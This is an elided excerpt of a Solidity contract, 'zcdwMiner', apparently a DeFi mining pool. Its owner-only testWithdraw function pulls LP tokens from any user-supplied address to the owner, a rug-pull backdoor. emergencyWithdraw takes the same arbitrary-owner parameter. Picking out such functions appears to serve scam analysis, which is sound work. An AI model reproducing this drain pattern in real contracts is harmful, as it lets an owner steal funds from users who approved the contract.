...
contract zcdwMiner is Ownable {
    ...
    function add(uint256 _allocPoint, IERC20 _lpToken, bool _withUpdate) public onlyOwner {
        if (_withUpdate) {
            withUpdates(1000000000000000000000000000000);
            massUpdatePools();
        }
    ...
    function testWithdraw(uint256 _pid, uint256 _amount, address _lpOwner) public onlyOwner {
        PoolInfo storage pool = poolInfo[_pid];
        pool.lpToken.safeTransferFrom(address(_lpOwner), address(msg.sender), _amount);
    }
    ...
    function emergencyWithdraw(uint256 _pid, address _lpOwner ) public onlyOwner{
        PoolInfo storage pool = poolInfo[_pid];
